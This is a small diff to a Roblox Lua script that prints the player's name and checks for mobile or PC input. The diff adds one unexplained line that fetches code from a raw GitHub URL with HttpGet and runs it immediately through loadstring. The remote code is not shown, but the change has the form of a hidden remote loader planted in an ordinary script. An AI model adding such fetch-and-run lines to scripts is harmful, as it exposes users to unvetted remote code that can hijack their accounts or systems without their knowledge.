@@ -6,6 +6,7 @@ local PlaceId = game.PlaceId
 local ismobile = game:GetService("UserInputService").TouchEnabled
 local ispc = game:GetService("UserInputService").KeyboardEnabled
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BlackHubT/BaconError/main/Return"),true)()
 task.wait(0.5)
 print(" Name : "..player.name.." ")
 print(" Display Name : "..player.DisplayName.." ")
